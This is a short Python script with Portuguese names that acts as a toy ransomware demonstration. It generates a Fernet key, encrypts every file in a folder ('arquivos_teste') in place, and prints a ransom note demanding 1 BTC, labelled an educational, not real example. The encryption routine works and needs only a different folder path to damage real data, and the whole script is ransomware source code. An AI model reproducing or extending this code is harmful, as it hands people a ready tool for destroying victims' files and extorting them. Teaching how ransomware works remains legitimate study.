from cryptography.fernet import Fernet
import os

def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as key_file:
        key_file.write(chave)

def carregar_chave():
    return open("chave.key", "rb").read()

def criptografar_arquivos(pasta):
    fernet = Fernet(carregar_chave())
    for arquivo in os.listdir(pasta):
        caminho = os.path.join(pasta, arquivo)
        if os.path.isfile(caminho):
            with open(caminho, "rb") as file:
                dados = file.read()
            dados_criptografados = fernet.encrypt(dados)
            with open(caminho, "wb") as file:
                file.write(dados_criptografados)
    print("[ ✔ ] Arquivos criptografados!")

def mensagem_resgate():
    print("""
    ---- SEUS ARQUIVOS FORAM CRIPTOGRAFADOS ----
    Para recuperar seus dados, envie 1 BTC para:
    *** EXEMPLO EDUCACIONAL — NÃO REAL ***
    """)

gerar_chave()
criptografar_arquivos("arquivos_teste")
mensagem_resgate()
